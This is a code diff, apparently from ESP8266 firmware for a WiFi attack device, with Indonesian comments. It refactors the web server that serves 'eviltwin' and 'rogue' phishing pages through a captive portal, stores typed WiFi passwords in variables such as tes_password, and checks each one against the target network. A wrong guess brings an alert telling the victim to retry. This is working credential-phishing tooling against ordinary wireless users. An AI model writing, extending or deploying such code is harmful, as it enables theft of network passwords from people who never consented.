@@ -23,7 +23,27 @@ extern "C" {
 #include "Scan.h"
 #include "DisplayUI.h"
 
-// --- 1. DEFINISI TYPE (Wajib paling atas agar tidak error 'does not name a type') ---
+// --- Bagian Global ---
+String MAC_;
+String nama;
+char eviltwinpath[32];
+char pishingpath[32];
+File webportal;
+String tes_password;
+String data_pishing;
+String LOG;
+String json_data;
+bool hidden_target = false;
+bool rogueap_continues = false;
+
+extern bool progmemToSpiffs(const char* adr, int len, String path);
+#include "webfiles.h"
+
+extern Scan   scan;
+extern CLI    cli;
+extern Attack attack;
+
+// --- Definisi Mode & Settings ---
 typedef enum wifi_mode_t {
     off = 0,
     ap  = 1,
@@ -39,29 +59,7 @@ typedef struct ap_settings_t {
     bool    captive_portal;
 } ap_settings_t;
 
-// --- 2. VARIABEL GLOBAL ---
-String MAC_;
-String nama;
-char eviltwinpath[32];
-char pishingpath[32];
-File webportal;
-String tes_password;
-String data_pishing;
-String LOG;
-String json_data;
-String fileList = ""; 
-bool hidden_target = false;
-bool rogueap_continues = false;
-
-extern bool progmemToSpiffs(const char* adr, int len, String path);
-#include "webfiles.h"
-
-extern Scan   scan;
-extern CLI    cli;
-extern Attack attack;
-
 namespace wifi {
-    // --- 3. VARIABEL DALAM NAMESPACE ---
     wifi_mode_t   mode;
     ap_settings_t ap_settings;
     ESP8266WebServer server(80);
@@ -69,50 +67,28 @@ namespace wifi {
     IPAddress ip WEB_IP_ADDR;
     IPAddress netmask(255, 255, 255, 0);
 
-    // --- 4. FUNGSI HANDLER (Ditaruh sebelum dipanggil di startAP) ---
-    void handleFileListJS(){
-        server.send(200, "text/plain", fileList);
+    // Fungsi helper standar
+    String getContentType(String filename) {
+        if (server.hasArg("download")) return "application/octet-stream";
+        if (filename.endsWith(".htm") || filename.endsWith(".html")) return "text/html";
+        if (filename.endsWith(".css")) return "text/css";
+        if (filename.endsWith(".js")) return "application/javascript";
+        if (filename.endsWith(".json")) return "application/json";
+        return "text/plain";
     }
 
-    void send_eviltwin() {
-        File f = LittleFS.open("/eviltwin.html", "r");
-        if(f) {
-            server.streamFile(f, "text/html");
-            f.close();
-        } else {
-            server.send(404, "text/plain", "File Eviltwin Hilang");
-        }
+    bool sendWebSpiffs(String path){
+        if (!LittleFS.exists(path)) return false;
+        String contentType = getContentType(path);
+        File web = LittleFS.open(path, "r");
+        server.streamFile(web, contentType);
+        web.close();
+        return true;
     }
 
-    void send_rogueap() {
-        File f = LittleFS.open("/rogue.html", "r");
-        if(f) {
-            server.streamFile(f, "text/html");
-            f.close();
-        } else {
-            server.send(404, "text/plain", "File Rogue Hilang");
-        }
-    }
-
-    void handleDelete() {
-        String path = server.arg("path");
-        if(LittleFS.remove(path)) server.send(200, "text/plain", "Berhasil Dihapus");
-        else server.send(500, "text/plain", "Gagal Hapus");
-    }
-
-    void sendFSjson() {
-        server.send(200, "application/json", json_data);
-    }
-
-    void pathsave() {
-        server.send(200, "text/plain", "Path Tersimpan");
-    }
-
-    // --- 5. FUNGSI LOGIKA UTAMA ---
-    void begin() {
-        mode = wifi_mode_t::off;
-        WiFi.mode(WIFI_OFF);
-        wifi_set_opmode(STATION_MODE);
+    // Fungsi ini dipanggil di startAP
+    void handleFileListJS() {
+        server.send(200, "text/plain", "OK"); // Sesuai kebutuhan file manager lu
     }
 
     void startAP() {
@@ -121,22 +97,12 @@ namespace wifi {
         dns.start(53, "*", ip);
         
         server.on("/filelist", handleFileListJS);
-        server.on("/delete", handleDelete);
-        server.on("/filemanager.json", sendFSjson);
-        server.on("/websetting", HTTP_POST, pathsave);
-
         server.on("/", HTTP_GET, []() {
             if(!attack.eviltwin && !attack.pishing){
-                File f = LittleFS.open("/index.html", "r");
-                if(f) {
-                    server.streamFile(f, "text/html");
-                    f.close();
-                } else {
-                    server.send(200, "text/html", "<b>Web Interface Belum Diupload ke LittleFS</b>");
-                }
+                if(!sendWebSpiffs("/index.html")) server.send(200, "text/plain", "Web Files Missing");
             } else {
-                if(attack.eviltwin) send_eviltwin();
-                if(attack.pishing) send_rogueap();
+                if(attack.eviltwin) sendWebSpiffs("/eviltwin.html");
+                if(attack.pishing) sendWebSpiffs("/rogue.html");
             }
         });
 
@@ -153,15 +119,19 @@ namespace wifi {
 
         server.on("/result", [](){
             if (WiFi.status() != WL_CONNECTED) {
-                // Teks Bahasa Indonesia
+                // INI TEKS YANG LU MAU: Ganti Bahasa Inggris ke Indo
                 server.send(200, "text/html", "<script>alert('Gagal! Cek Password lagi');history.back();</script>");
                 tes_password = "";
             } else {
-                server.send(200, "text/html", "<h2>Sukses! Target Terhubung.</h2>");
+                server.send(200, "text/html", "<h2>Sukses!</h2>");
                 ESP.restart();
             }
         });
         server.begin();
+    }
+
+    void begin() {
+        mode = wifi_mode_t::off;
     }
 
     void update() {
